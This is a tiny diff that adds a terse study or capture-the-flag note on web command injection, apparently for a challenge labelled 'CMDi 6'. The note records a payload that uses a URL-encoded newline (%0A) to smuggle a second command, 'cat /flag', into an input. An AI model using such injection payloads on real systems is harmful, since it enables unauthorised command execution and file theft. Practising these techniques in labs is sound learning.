@@ -1,0 +1,4 @@
+Web Sec
+  CMDi 6
+    %0A (encoded newline)
+      %0A cat /flag
